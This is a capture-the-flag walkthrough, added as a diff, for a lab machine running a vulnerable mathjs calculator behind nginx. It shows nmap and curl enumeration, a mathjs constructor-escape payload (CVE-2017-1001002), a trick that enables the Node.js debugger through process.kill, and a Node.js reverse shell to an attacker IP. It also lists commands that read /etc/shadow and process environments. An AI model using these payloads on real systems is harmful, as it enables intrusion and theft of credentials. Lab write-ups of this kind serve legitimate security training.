@@ -1,0 +1,244 @@
+Pre-Requisis:
+one and only Install Chrome version chrome 68.0.3440.84 (Official Build) (64-bit) As mentioned in the description.
+
+
+Enumeration:
+Start with nmap scan
+
+sudo nmap -p- --min-rate=10000 -sC -sV -Pn 10.0.30.60                                                                                                                    1 ⨯
+[sudo] password for daniyal: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 08:49 PKT
+Warning: 10.0.30.60 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.0.30.60
+Host is up (0.26s latency).
+Not shown: 65513 closed tcp ports (reset)
+PORT      STATE    SERVICE       VERSION
+80/tcp    open     http          nginx 1.10.3
+|_http-title: Welcome to Aryabhata
+|_http-server-header: nginx/1.10.3
+8936/tcp  filtered unknown
+9229/tcp  open     http          nginx 1.10.3
+|_http-title: 502 Bad Gateway
+|_http-server-header: nginx/1.10.3
+11320/tcp filtered imip-channels
+15343/tcp filtered unknown
+22066/tcp filtered unknown
+22110/tcp filtered unknown
+28156/tcp filtered unknown
+32068/tcp filtered unknown
+32749/tcp filtered unknown
+35182/tcp filtered unknown
+39459/tcp filtered unknown
+41150/tcp filtered unknown
+42669/tcp filtered unknown
+51270/tcp filtered unknown
+52119/tcp filtered unknown
+53870/tcp filtered unknown
+60308/tcp filtered unknown
+60352/tcp filtered unknown
+61863/tcp filtered unknown
+62766/tcp filtered unknown
+63818/tcp filtered unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.66 seconds
+
+We found two ports open one is http server and other is unknown after googling we found that the other port is used by nodejs debugger by default
+
+we will use curl to do soem basic enumeration
+curl:
+Curl is a commmnd line tool that is used to send and recieve data we can see the site headers etc. -I flag is specifically used to capture the headers 
+of the website and we will use this headers to find some useful information for further information you can search for curl on internet or read the curl manual
+using "man curl" command
+curl -I http://10.0.30.60
+
+curl -I http://10.0.30.60                                                                                                                                               56 ⨯
+HTTP/1.1 200 OK
+Server: nginx/1.10.3
+Date: Sat, 04 Dec 2021 04:08:43 GMT
+Content-Type: text/html
+Content-Length: 1921
+Last-Modified: Fri, 31 Jul 2020 10:21:52 GMT
+Connection: keep-alive
+ETag: "5f23f0c0-781"
+Accept-Ranges: bytes
+
+Now do the same for the other port
+
+curl -I http://10.0.30.60:9229
+HTTP/1.1 502 Bad Gateway
+Server: nginx/1.10.3
+Date: Sat, 04 Dec 2021 04:09:38 GMT
+Content-Type: text/html
+Content-Length: 173
+Connection: keep-alive
+
+But in the start port 9229 isn't that useful because as mentioned in target description we have to exploit the port 80 first and tehn we can use port 9229
+Now let's visit the webpage in our browser and see the page source and check if we find something informative
+we have a comment and we can see a javascript that how actually the equation is calculated
+Comment:
+ <!--
+          the trick is to use koti-jyā instead of jyā
+        -->
+SCRIPT:
+
+      <script>
+
+        $( document ).ready(function() {
+          $(':button').click(function()
+          {
+            equation=$('#equation').val();
+/*
+            $.post( "/got_maths/", { equation: equation }, function( data ) {
+*/
+            $.post( "/got_maths/maths", { equation: equation }, function( data ) {
+              $('#dialog').html(data);
+            });
+          });
+        });
+      </script>
+
+We can see that the user input and calculation is handled by a file "/got_maths/maths" alternatively you can use burpsuite too and intercept the POST erquest while your enter the equation
+and you will see the same results (it deepnds on your preference)
+I will use curl once again to see soething useful about math script
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot GET /math</pre>
+</body>
+</html>
+
+This tells that we can't see the script
+
+Now lets try to see the headers
+curl -I http://10.0.30.60/got_maths/maths 
+HTTP/1.1 404 Not Found
+Server: nginx/1.10.3
+Date: Sat, 04 Dec 2021 04:20:01 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 144
+Connection: keep-alive
+X-Powered-By: Express
+Content-Security-Policy: default-src 'none'
+X-Content-Type-Options: nosniff
+
+From the header X-Powered-By: Express This headers tells us what kind of server it is (Source: stackoverflow)
+from this we know taht we can pass math script from nginx to nodejs and also earlier we saw taht /math is not accessible via GET
+Now as far as we know we get our calculation answer only if we are providing the correct parameters
+I will use "help" to see if it works as a parameter I will use curl again with urlencoding. You can also use browser for this, again preference!!!.
+
+AAAAANNNNNNDDDDD guess what we have!!!!
+
+curl --date-urlencode 'equation=help' "http://10.0.30.60/got_maths/maths"
+Math result: function help(arg0) {
+  "use strict";
+  var name = 'help';
+  // type: any
+  if (arguments.length === 1) {
+    return signature0(arg0); // signature: any
+  }
+  if (arguments.length > 1) {
+    throw createError(name, arguments.length, 1, arguments[1]);
+  }
+  throw createError(name, arguments.length, 0, arguments[0], 'any');
+} 
+
+we know that this is a javascript code and also it is taking arguments. From the comment that we found earlier in the HTML, we can use functions like cos() and sin()
+let's confirm
+
+curl --data-urlencode 'equation=help(sin)' "http://10.0.30.60/got_maths/maths"
+Math result: 
+Name: sin
+
+Category: Trigonometry
+
+Description:
+    Compute the sine of x in radians.
+
+Syntax:
+    sin(x)
+
+Examples:
+    sin(2)
+        0.90929742682568
+    sin(pi / 4) ^ 2
+        0.5
+    sin(90 deg)
+        1
+    sin(30 deg)
+        0.5
+    sin(0.2)^2 + cos(0.2)^2
+        1
+
+See also: asin, cos, tan
+
+now let's find out the version of the library this script is using 
+
+curl --data-urlencode 'equation=version' "http://10.0.30.60/got_maths/maths"
+Math result: 3.10.1
+
+After googling the specififc version of library i found a vulnerability and a rare guide toe xploit it the vulnerability CVE is CVE-2017-1001002 
+this is where someone actually exploited this vulnerability. Though this vulnerabilty wasn't exploited in the wild and can't be used in real world but this machine uses it.
+Link to exploit: https://jwlss.pw/mathjs/
+
+the payload will be:
+cos.constructor("return process.something")() 
+we can futher edit it for our usage
+
+There are few diffrent ways to proceed from our standpoint. We will use the main idea that is use the nodejs debugging functionality and get access to the full application
+this is ppossible because nginx is proxying that service as we can see from our enumeartion. There are two possible ways to enable nodejs debugger
+1) passing --inspect argument to nodejs 
+2) passing SIGUSR1 signal
+
+The first method is not possible from our perspective because we don't have access to the remote target shell yet but the other is possible adn for that we will use javascript.
+to send a signal to a running process from nodejs to the OS is by using "process.kill(pid,SIGNAL). You can access the pid by using "process.pid" and the signal for SIGUSR1 is 10 
+in linux you can use kill -l to list all the signals and their corresponding numeric values.
+
+EXPLOITATION:
+Now lets enable the nodejs debugger first and then use our browser to access it.
+
+curl -d 'equation=cos.constructor("return process.kill(process.pid,10)")()' http://10.0.30.60/got_maths/maths
+Math result: true 
+
+This has enabled nodejs debugger from nodejs documentaiton you can access this by using your browser I used google chrome because it was easy for me to configure.
+as we know port 9229 is already running but we can visit it yet but this time we get 400 bad request instead of bad gateway error.
+
+Configuration:
+1) installed the specified chrome version (also listed in the resources). This is becasue the chrome version is copatible with the installed ndoejs version. other versions don't work
+2) visit chrome://inspect >> devices
+3) add remote host IP and PORT that is 10.0.30.60:9229
+4) click on Open dedicated DevTools for Node
+also you will see the path of /maths or you can click on inspect under the file path
+
+Reverse shell:
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(PORT, "YOUR_IP", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // this funciton will prevernt ndoejs from crashing
+})();
+
+start netcat lsitener and change your port and IP and hunt for the flags no PE required
+
+Flags Locations:
+IMPORTANT FOR ARGV FLAG:
+use your terminal and this paylaod to get your argv flag
+1: curl -d 'equation=cos.constructor("return process.argv")()' http://10.0.30.60/got_maths/maths
+OTHER FLAGS CAN BE CAUGHT FROM THE SHELL:
+2: cat /home/ETSCTF/got_maths/maths/flag.json | grep "ETSCTF"
+3: vat /home/ETSCTF/got_maths/maths/app.js | grep "ETSCTF"
+4: cat /etc/passwd | grep "ETSCTF"
+5: cat /etc/shadow | grep "ETSCTF"
+6: cat /proc/*/environ (find the flag in first line of the output grep doesn't work)
+7: ls /root/
